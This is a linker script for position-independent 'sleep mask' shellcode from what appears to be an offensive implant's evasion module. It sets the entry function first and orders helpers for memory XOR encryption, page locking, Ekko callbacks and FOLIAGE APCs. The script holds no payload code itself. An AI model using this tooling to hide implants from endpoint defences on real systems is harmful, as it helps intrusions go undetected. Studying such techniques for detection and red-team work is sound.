/*
 * evasion_pic.ld — Linker script for the PIC sleep mask shellcode.
 *
 * Forces pic_fill_exports to offset 0 of the .text output section so that
 * evasion.c can call it as  ((fill_fn_t)alloc_base)(&ctx).
 * All other functions follow in linker order.
 */
SECTIONS
{
    .text :
    {
        /* Entry point — MUST be first */
        *(.text.pic_fill_exports)

        /* Main dispatcher */
        *(.text.sleep_mask_entry)

        /* Helpers */
        *(.text.pic_plain_sleep)
        *(.text.pic_xor_regions)
        *(.text.pic_noaccess_lock)
        *(.text.pic_noaccess_unlock)
        *(.text.pic_emergency_decrypt)

        /* Ekko callbacks */
        *(.text.pic_ekko_encrypt_cb)
        *(.text.pic_ekko_decrypt_cb)

        /* FOLIAGE APCs + thread */
        *(.text.pic_foliage_encrypt_apc)
        *(.text.pic_foliage_sleep_apc)
        *(.text.pic_foliage_decrypt_apc)
        *(.text.pic_foliage_thread_entry)

        /* Catch-all (compiler helpers, etc.) */
        *(.text*)
    }

    /* Discard everything else — we only need .text */
    /DISCARD/ : { *(*) }
}
